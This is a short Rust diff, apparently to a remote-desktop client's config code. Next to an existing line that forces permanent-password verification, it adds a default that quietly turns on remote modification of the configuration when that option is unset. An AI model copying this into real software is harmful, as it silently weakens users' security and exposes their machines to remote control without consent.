@@ -460,6 +460,11 @@ impl Config2 {
             config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
             store = true;
         }
+
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
         
         if store {
             config.store();
